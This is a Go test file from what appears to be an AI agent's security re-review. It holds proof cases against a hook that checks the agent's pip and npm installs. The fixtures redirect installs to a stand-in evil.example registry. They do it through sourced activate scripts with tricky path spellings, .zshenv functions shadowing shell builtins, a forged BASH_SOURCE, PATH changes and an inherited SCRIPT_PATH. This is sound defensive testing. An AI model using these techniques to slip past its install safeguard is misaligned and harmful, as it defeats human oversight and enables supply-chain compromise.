//go:build unix

package main

// Independent re-review of d44c23d and a78e8df (REPO-POL-NPMRC rounds 6 and 7, ADR-0174 rounds 11 and 12), 2026-11-15:
// proof tests. A failing case is a finding: the line, using a sourced activate script the template match accepts (or
// one the hook never reads), moves where the install comes from, and an exception covers the hold.

import (
	"path/filepath"
	"testing"

	"github.com/alalanet/alalanet-agent/internal/installread"
)

const r7evilIndex = "[global]\nindex-url = https://evil.example/simple\n"

// r7onPath reports (without stopping) whether the command is on the exception path.
func r7onPath(t *testing.T, command string) bool {
	t.Helper()
	targets, unread, _, subst := installread.ParseLine(command)
	return len(targets) > 0 && len(unread) == 0 && !subst && len(installread.HookExtra(command, targets, unread, subst)) == 0
}

// r7venv: dir/bin/activate from a template with dir as its venv, a pyvenv.cfg, and pip.conf when conf is set.
func r7venv(t *testing.T, dir, tmpl, conf string) {
	t.Helper()
	mkdir(t, filepath.Join(dir, "bin"))
	write(t, filepath.Join(dir, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(dir, "bin", "activate"), activateFrom(t, tmpl, dir, ""))
	if conf != "" {
		write(t, filepath.Join(dir, "pip.conf"), conf)
	}
}

// R7-1: the template match accepts a venv the path rule (pypiFiles' "a program the line runs by its path") does not
// read, so that venv's pip.conf — which pip, run from that venv's bin after activate, reads as its site config — is
// never judged. Round 11 removed the reading of VIRTUAL_ENV from the sourced script; the path rule alone is left.
func TestR7ReviewSourcedVenvSiteConfig(t *testing.T) {
	// a venv under ~ named by the line with ~/: sourced() expands ~, commandWord's path does not (cwd/~/v)
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	r7venv(t, filepath.Join(home, "v"), "uv-0.13.7", r7evilIndex)
	cmd := "source ~/v/bin/activate && pip install acme-tools==2.0.1"
	if form, stderr := round7(t, cwd, cmd, npmrcFiles(t, "", home, nil, nil)); form == "silent" {
		t.Errorf("~/v's pip.conf names another index: an exception covers it (on path %v, stderr %q)", r7onPath(t, cmd), stderr)
	}
	// a venv whose folder has a space (the uv template quotes the path): commandWord splits the word at the space
	_, _, cwd = npmWorkspace(t)
	r7venv(t, filepath.Join(cwd, "my env"), "uv-0.13.7", r7evilIndex)
	cmd = `source "my env/bin/activate" && pip install acme-tools==2.0.1`
	if form, stderr := round7(t, cwd, cmd, nil); form == "silent" {
		t.Errorf("'my env''s pip.conf names another index: an exception covers it (on path %v, stderr %q)", r7onPath(t, cmd), stderr)
	}
}

// R7-2: a sourced path the shell resolves elsewhere than the hook: ~+ ($PWD), and a quoted ~ (no expansion in the shell,
// expanded by sourced()). The hook reads a missing or a genuine file; the shell sources one the agent wrote.
func TestR7ReviewSourcedPathSpelling(t *testing.T) {
	const evil = "export npm_config_registry=https://evil.example/\n"
	// ~+/e/bin/activate is $PWD/e/bin/activate to bash and zsh; the hook reads cwd/~+/e/bin/activate (missing: nil)
	_, _, cwd := npmWorkspace(t)
	mkdir(t, filepath.Join(cwd, "e", "bin"))
	write(t, filepath.Join(cwd, "e", "bin", "activate"), evil)
	cmd := "source ~+/e/bin/activate && npm i @acme/cli"
	if form, stderr := round7(t, cwd, cmd, nil); form == "silent" {
		t.Errorf("%s: an exception covers it (on path %v, stderr %q)", cmd, r7onPath(t, cmd), stderr)
	}
	// "~/v/bin/activate": the shell sources cwd/~/v/bin/activate (the agent's), the hook may read home/v (a template)
	_, _, cwd = npmWorkspace(t)
	home := t.TempDir()
	r7venv(t, filepath.Join(home, "v"), "uv-0.13.7", "")
	mkdir(t, filepath.Join(cwd, "~", "v", "bin"))
	write(t, filepath.Join(cwd, "~", "v", "bin", "activate"), evil)
	for _, cmd := range []string{`source "~/v/bin/activate" && npm i @acme/cli`, `source \~/v/bin/activate && npm i @acme/cli`} {
		if form, stderr := round7(t, cwd, cmd, npmrcFiles(t, "", home, nil, nil)); form == "silent" {
			t.Errorf("%s: an exception covers it (on path %v, stderr %q)", cmd, r7onPath(t, cmd), stderr)
		}
	}
}

// R7-3: the templates run more than the six helpers: hash (and [, unset, alias, unalias, true, return). A startup
// file's function of one of those names runs inside the trusted template. Checked in zsh 5.9: with this .zshenv,
// ". .venv/bin/activate && pwd" prints the other folder.
func TestR7ReviewTemplateBuiltinFunction(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	r7venv(t, filepath.Join(cwd, ".venv"), "uv-0.13.7", "")
	other := t.TempDir()
	write(t, filepath.Join(other, "package.json"), "{}\n")
	write(t, filepath.Join(other, ".npmrc"), "registry=https://evil.example/\n")
	home := t.TempDir()
	cmd := ". .venv/bin/activate && npm i @acme/cli"
	// round 13 (the coordinator's decision: pin, do not read): pinned before the change, held after it
	if form, stderr := r13pinned(t, cwd, cmd, home, func() {
		write(t, filepath.Join(home, ".zshenv"), "hash() { builtin cd "+other+"; }\n")
	}); form == "silent" {
		t.Errorf("a hash function in .zshenv: an exception covers it (on path %v, stderr %q)", r7onPath(t, cmd), stderr)
	}
}

// R7-4: the relocatable template takes its path from BASH_SOURCE when BASH_VERSION is set; in zsh both are plain
// variables a startup file may set. Checked in zsh 5.9: VIRTUAL_ENV and PATH's first folder become the other venv's.
func TestR7ReviewRelocatableBashSource(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	venv := filepath.Join(cwd, ".venv")
	mkdir(t, filepath.Join(venv, "bin"))
	write(t, filepath.Join(venv, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(venv, "bin", "activate"), activateFrom(t, "uv-0.13.7-relocatable", "", ""))
	evil := t.TempDir()
	r7venv(t, evil, "uv-0.13.7", r7evilIndex)
	home := t.TempDir()
	cmd := ". .venv/bin/activate && pip install acme-tools==2.0.1"
	if form, stderr := r13pinned(t, cwd, cmd, home, func() {
		write(t, filepath.Join(home, ".zshenv"), "typeset -A BASH_SOURCE\nBASH_SOURCE[0]="+evil+"/bin/activate\nBASH_VERSION=5\n")
	}); form == "silent" {
		t.Errorf("BASH_SOURCE in .zshenv: an exception covers it (on path %v, stderr %q)", r7onPath(t, cmd), stderr)
	}
}

// R7-5 (pre-existing, outside the template): the same moves without any sourced script — PATH in a startup file
// (round 10's T1 in .zshenv), and a function named like a command the line may run besides the install (echo).
func TestR7ReviewStartupWithoutTemplate(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	evil := t.TempDir()
	r7venv(t, evil, "uv-0.13.7", r7evilIndex)
	write(t, filepath.Join(evil, "bin", "pip"), "#!/bin/sh\n")
	home := t.TempDir()
	cmd := "pip install acme-tools==2.0.1"
	if form, stderr := r13pinned(t, cwd, cmd, home, func() {
		write(t, filepath.Join(home, ".zshenv"), "export PATH=\""+evil+"/bin:$PATH\"\n")
	}); form == "silent" {
		t.Errorf("PATH in .zshenv: an exception covers it (stderr %q)", stderr)
	}
	_, _, cwd = npmWorkspace(t)
	other := t.TempDir()
	write(t, filepath.Join(other, "package.json"), "{}\n")
	write(t, filepath.Join(other, ".npmrc"), "registry=https://evil.example/\n")
	home = t.TempDir()
	cmd = "echo hi && npm i @acme/cli"
	if form, stderr := r13pinned(t, cwd, cmd, home, func() {
		write(t, filepath.Join(home, ".zshenv"), "echo() { builtin cd "+other+"; }\n")
	}); form == "silent" {
		t.Errorf("an echo function in .zshenv: an exception covers it (on path %v, stderr %q)", r7onPath(t, cmd), stderr)
	}
}

// Controls: the forms above with nothing moved stay silent (so a fix does not hold them).
func TestR7ReviewControls(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	home := t.TempDir()
	r7venv(t, filepath.Join(home, "v"), "uv-0.13.7", "")
	if form, stderr := round7(t, cwd, "source ~/v/bin/activate && pip install acme-tools==2.0.1", npmrcFiles(t, "", home, nil, nil)); form != "silent" {
		t.Errorf("~/v, nothing moved: %s (stderr %q)", form, stderr)
	}
	_, _, cwd = npmWorkspace(t)
	r7venv(t, filepath.Join(cwd, "my env"), "uv-0.13.7", "")
	if form, stderr := round7(t, cwd, `source "my env/bin/activate" && pip install acme-tools==2.0.1`, nil); form != "silent" {
		t.Errorf("'my env', nothing moved: %s (stderr %q)", form, stderr)
	}
}

// R7-6: under a shell that is none of bash, zsh and ksh (dash, Debian's sh), the relocatable template keeps the
// SCRIPT_PATH it inherits; the line can set it for the shell it starts.
func TestR7ReviewRelocatableInheritedScriptPath(t *testing.T) {
	_, _, cwd := npmWorkspace(t)
	venv := filepath.Join(cwd, ".venv")
	mkdir(t, filepath.Join(venv, "bin"))
	write(t, filepath.Join(venv, "pyvenv.cfg"), "home = /usr/bin\n")
	write(t, filepath.Join(venv, "bin", "activate"), activateFrom(t, "uv-0.13.7-relocatable", "", ""))
	evil := t.TempDir()
	r7venv(t, evil, "uv-0.13.7", r7evilIndex)
	for _, cmd := range []string{
		"SCRIPT_PATH=" + evil + "/bin/activate sh -c '. .venv/bin/activate && pip install acme-tools==2.0.1'",
		"export SCRIPT_PATH=" + evil + "/bin/activate; sh -c '. .venv/bin/activate && pip install acme-tools==2.0.1'",
	} {
		if form, stderr := round7(t, cwd, cmd, nil); form == "silent" {
			t.Errorf("%s: an exception covers it (on path %v, stderr %q)", cmd, r7onPath(t, cmd), stderr)
		}
	}
}

// Invariant 1 for the prompt (a guard: the round's tests cover the path's syntax set and the prompt's length and a
// space, not the prompt's other syntax): every shell-syntax byte in the prompt is no match, in a template that quotes
// it (uv's "…") and in one that does not (CPython 3.13's VIRTUAL_ENV_PROMPT=@PROMPT@).
func TestR7ReviewPromptSyntax(t *testing.T) {
	for _, tmpl := range []string{"uv-0.13.7-prompt", "cpython-3.13.18", "cpython-3.12.14"} {
		for _, prompt := range []string{"p'x", `p"x`, "p$x", "p`x", "p;x", "p x", `p\x`, "p)x", "p(x", "p\nx", "p&x", "p|x",
			"p<x", "p*x", "p~x", "p/x", "p@x", "p+x", "p=x", "p{x", "p#x", "p!x"} {
			p := venvAt(t, t.TempDir(), ".venv", tmpl, prompt)
			if moved, _ := sourcedMoved(t, p); !moved {
				t.Errorf("%s, prompt %q: matched a template", tmpl, prompt)
			}
		}
		for _, prompt := range []string{"proj", "-x", "a.b_c-d"} {
			p := venvAt(t, t.TempDir(), ".venv", tmpl, prompt)
			if moved, why := sourcedMoved(t, p); moved {
				t.Errorf("%s, prompt %q: %s", tmpl, prompt, why)
			}
		}
	}
}
